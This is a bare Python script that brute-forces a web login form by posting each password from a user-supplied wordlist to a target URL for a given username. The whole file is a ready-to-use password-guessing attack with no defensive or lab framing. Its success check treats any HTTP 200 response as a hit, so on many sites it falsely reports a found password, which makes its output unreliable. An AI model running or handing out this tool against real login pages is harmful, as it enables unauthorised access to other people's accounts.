import requests

def brute_force_login(url, username, password_list):
    for password in password_list:
        password = password.strip()
        data = {
            'username': username,
            'password': password
        }

        try:
            response = requests.post(url, data=data)
            if 'Welcome' in response.text or response.status_code == 200:
                print(f"Password found: {password}")
                return True
            else:
                print(f"Tried: {password} - failed")
        except Exception as e:
            print(f"Error trying {password}: {e}")

    print("Password not found in the provided list.")
    return False

if __name__ == "__main__":
    target_url = input('Enter target login URL: ').strip()
    username = input('Enter username: ').strip()
    wordlist_path = input('Enter path to password list file: ').strip()

    try:
        
        with open(wordlist_path, 'r') as f:
            passwords = f.readlines()
    except:
        print('Could not read password file.')
        exit()


    brute_force_login(target_url, username, passwords) 

    

    